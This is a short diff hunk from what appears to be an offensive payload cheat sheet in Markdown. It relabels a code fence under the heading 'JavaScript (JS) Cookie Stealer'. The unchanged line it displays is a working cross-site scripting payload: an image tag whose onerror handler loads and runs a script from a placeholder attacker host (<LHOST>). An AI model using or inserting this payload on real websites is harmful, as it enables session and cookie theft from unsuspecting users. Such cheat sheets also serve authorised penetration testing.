@@ -41,7 +41,7 @@ x.send();
 
 #### JavaScript (JS) Cookie Stealer
 
-```js
+```javascript
 <img src=1 onerror="this.remove(); var s=document.createElement('script'); s.src='http://<LHOST>/<FILE>.js'; document.body.appendChild(s);">
 ```
 
